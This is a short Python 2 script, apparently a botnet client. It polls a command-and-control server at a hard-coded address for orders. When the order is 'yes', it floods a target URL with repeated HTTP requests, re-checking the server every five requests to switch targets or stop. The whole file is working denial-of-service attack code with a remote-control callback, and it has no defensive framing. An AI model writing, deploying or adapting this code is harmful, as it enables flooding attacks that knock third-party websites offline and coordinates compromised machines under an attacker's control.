#!/usr/bin/python

import urllib2


candc = "192.168.1.56"

while(True):
    # get tendril orders
    orders = urllib2.urlopen("http://" + candc + "/orders").read().split("\n")

    # perform action (for extra cuteness)
    doit = orders[0]
    target = orders[1]

    if doit == "yes":
        # let the cuteness begin
        # command refresh intervall = 10
        count = 0
        while(True):
            if count%5 == 0:
                orders = urllib2.urlopen("http://" + candc + "/orders").read().split("\n")
                if orders[0] == "no":
                    #print "stop attack"
                    break
                else:
                    target = orders[1]
                count = 0
            #print target
            urllib2.urlopen(target)
            count += 1